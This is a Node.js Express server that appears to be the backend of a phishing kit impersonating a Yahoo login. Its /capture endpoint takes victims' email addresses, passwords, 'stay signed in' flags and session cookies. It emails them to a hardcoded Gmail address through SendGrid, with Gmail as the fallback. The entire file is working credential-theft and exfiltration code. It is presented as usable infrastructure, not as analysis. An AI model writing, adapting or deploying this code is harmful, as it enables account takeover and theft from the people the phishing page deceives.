const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();
const port = process.env.PORT || 3000; // Render assigns PORT

// Middleware
app.use(express.json());
app.use(cors({
    origin: '*', // Restrict to your front-end domain in production
    methods: ['POST'],
    allowedHeaders: ['Content-Type']
}));

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).send('Server is running');
});

// Primary: SendGrid transporter
const sendGridTransporter = nodemailer.createTransport({
    host: 'smtp.sendgrid.net',
    port: 587,
    auth: {
        user: 'apikey',
        pass: process.env.SENDGRID_API_KEY // Load from env
    }
});

// Fallback: Gmail transporter
const gmailTransporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.GMAIL_USER, // Load from env
        pass: process.env.GMAIL_PASS // Load from env
    }
});

// Verify transporters
sendGridTransporter.verify((error, success) => {
    console.log(error ? `SendGrid transporter error:${error}` : 'SendGrid transporter ready');
});
gmailTransporter.verify((error, success) => {
    console.log(error ? `Gmail transporter error:${error}` : 'Gmail transporter ready');
});

// Endpoint to capture email, password, stay signed in status, and cookies
app.post('/capture', async (req, res) => {
    try {
        const { email, password, staySignedIn, cookies } = req.body;
        if (!email || !password) {
            console.log('Missing email or password:', req.body);
            return res.status(400).send('Missing email or password');
        } const data = `            Email:${email}
            Password:${password}
            Stay Signed In:${staySignedIn}
            Cookies:${cookies || 'None'}
            Timestamp:${new Date().toISOString()}
        `;

        const mailOptions = {
            from: process.env.GMAIL_USER || 'doyinbayo19@gmail.com',
            to: process.env.GMAIL_USER || 'doyinbayo19@gmail.com',
            subject: 'New Yahoo Login Capture',
            text: data
        };
        // Try SendGrid, fall back to Gmail
        try {
            await sendGridTransporter.sendMail(mailOptions);
            console.log('Email sent via SendGrid:', data);
        } catch (sendGridError) {
            console.error('SendGrid error:', sendGridError);
            await gmailTransporter.sendMail(mailOptions);
            console.log('Email sent via Gmail (fallback):', data);
        } res.status(200).send('Data received');
    } catch (err) {
        console.error('Error processing request:', err);
        res.status(500).send('Server error');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});